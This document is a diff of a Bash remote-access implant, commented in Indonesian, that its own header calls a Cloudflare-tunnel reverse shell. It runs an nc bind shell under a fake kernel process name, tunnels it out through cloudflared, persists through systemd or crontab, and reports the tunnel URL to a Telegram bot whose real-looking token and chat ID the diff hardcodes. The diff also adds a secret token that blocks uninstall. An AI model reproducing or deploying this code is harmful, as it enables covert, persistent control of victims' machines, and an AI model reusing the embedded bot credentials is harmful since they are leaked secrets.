@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Cloudflare Tunnel Reverse Shell (seperti gsocket) + Telegram notifikasi
 # Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
+# Uninstall: CF_UNINSTALL=<token> bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 
 # ========== KONFIGURASI ==========
 : "${HOME:=/tmp}"
@@ -21,9 +21,9 @@ KERNEL_PROC_NAMES=(
 )
 PROC_HIDDEN_NAME="${KERNEL_PROC_NAMES[$((RANDOM % ${#KERNEL_PROC_NAMES[@]}))]}"
 
-# ========== TELEGRAM NOTIFICATION (ISI SESUAI) ==========
-TELEGRAM_BOT_TOKEN="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"   # Ganti dengan token bot Anda
-TELEGRAM_CHAT_ID="123456789"                                 # Ganti dengan chat ID Anda
+# ========== TELEGRAM NOTIFICATION ==========
+TELEGRAM_BOT_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
+TELEGRAM_CHAT_ID="6223261018"
 
 mkdir -p "$TMPDIR" 2>/dev/null || true
 set -euo pipefail
@@ -105,7 +105,6 @@ start_bindshell() {
     else
         bind_cmd="bash -c 'while true; do nc -l -p ${port} -s 127.0.0.1 -e /bin/bash 2>/dev/null; done'"
     fi
-    # Jalankan dalam subshell background agar tidak menggantikan shell utama
     ( exec -a "$PROC_HIDDEN_NAME" nohup $bind_cmd >/dev/null 2>&1 ) &
     echo $!
 }
@@ -114,7 +113,6 @@ start_bindshell() {
 start_tunnel_direct() {
     local port="$1"
     local bin="$2"
-    # Jalankan dalam subshell background, arahkan output ke log
     ( exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://127.0.0.1:${port}" >> "$TMPDIR/cloudflared.log" 2>&1 ) &
     echo $!
 }
@@ -172,7 +170,8 @@ EOF
 install_persistence() {
     local script_path="$1"
     local service_name="cf-tunnel"
-    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
+    # Cek apakah systemd user tersedia
+    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null 2>&1; then
         mkdir -p "${HOME}/.config/systemd/user"
         cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
 [Unit]
@@ -189,9 +188,9 @@ StandardError=null
 [Install]
 WantedBy=default.target
 EOF
-        systemctl --user daemon-reload
-        systemctl --user enable "$service_name"
-        systemctl --user start "$service_name"
+        systemctl --user daemon-reload 2>/dev/null || true
+        systemctl --user enable "$service_name" 2>/dev/null || true
+        systemctl --user start "$service_name" 2>/dev/null || true
         return 0
     elif command -v crontab >/dev/null; then
         (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
@@ -201,10 +200,23 @@ EOF
     fi
 }
 
-# ========== UNINSTALL ==========
+# ========== UNINSTALL (dengan token) ==========
 uninstall() {
+    # Baca token yang tersimpan
+    local token_file="${HOME}/.${CONFIG_DIR}/.uninstall_token"
+    if [[ ! -f "$token_file" ]]; then
+        echo "No installation found or token missing."
+        exit 1
+    fi
+    local stored_token=$(cat "$token_file")
+    # Cek variabel lingkungan CF_UNINSTALL
+    if [[ -z "${CF_UNINSTALL:-}" ]] || [[ "$CF_UNINSTALL" != "$stored_token" ]]; then
+        echo "Invalid uninstall token. Use CF_UNINSTALL=<token> bash -c ..."
+        exit 1
+    fi
+
     print_step "Removing installed files..."
-    # Baca file konfigurasi jika ada
+    # Baca file konfigurasi PID jika ada
     local conf_file="${HOME}/.${CONFIG_DIR}/tunnel.conf"
     if [[ -f "$conf_file" ]]; then
         source "$conf_file"
@@ -229,7 +241,8 @@ uninstall() {
 }
 
 # ========== MAIN ==========
-[[ -n "${GS_UNDO:-}" ]] && uninstall
+# Cek uninstall dengan token
+[[ -n "${CF_UNINSTALL:-}" ]] && uninstall
 
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
@@ -270,7 +283,7 @@ else
     finish_skip
 fi
 
-# --- Step 6 & 7: Installing access via ~/.bashrc & ~/.profile ---
+# --- Step 6 & 7: Installing access via ~/.bashrc & ~/.profile (dummy) ---
 print_step "Installing access via ~/.bashrc..."
 finish_skip
 print_step "Installing access via ~/.profile..."
@@ -280,8 +293,13 @@ finish_skip
 print_step "Executing webhooks..."
 finish_skip
 
+# --- Buat token uninstall ---
+UNINSTALL_TOKEN=$(openssl rand -hex 8 2>/dev/null || head -c 8 /dev/urandom | xxd -p 2>/dev/null || echo "default")
+echo "$UNINSTALL_TOKEN" > "${INSTALL_DIR}/.uninstall_token"
+chmod 600 "${INSTALL_DIR}/.uninstall_token"
+
 # --- Informasi uninstall ---
-echo "--> To uninstall use GS_UNDO=1 bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
+echo "--> To uninstall, use: CF_UNINSTALL=$UNINSTALL_TOKEN bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)\""
 echo "--> To connect use one of the following:"
 echo "--> cloudflared access tcp --hostname <URL> --url localhost:4444 && nc localhost 4444"
 
@@ -302,13 +320,13 @@ EOF
 
 # Tunggu URL awal
 sleep 5
-# Cek log untuk URL (gunakan grep -oE untuk portabilitas)
+# Cek log untuk URL
 if [[ -f "$TMPDIR/cloudflared.log" ]]; then
     url=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$TMPDIR/cloudflared.log" | head -1)
     if [[ -n "$url" ]]; then
         echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m"
         echo "Connect with: cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444"
-        # Kirim via Telegram juga
+        # Kirim via Telegram
         send_telegram "<b>Initial Tunnel URL</b>\n$url"
     else
         warn "Tunnel URL not detected yet. Check $TMPDIR/cloudflared.log"
@@ -328,4 +346,4 @@ fi
 
 echo "--> Join us on Telegram - https://t.me/thcorg"
 echo
-info "Done. Use GS_UNDO=1 to uninstall."
+info "Done. Use CF_UNINSTALL=$UNINSTALL_TOKEN to uninstall."
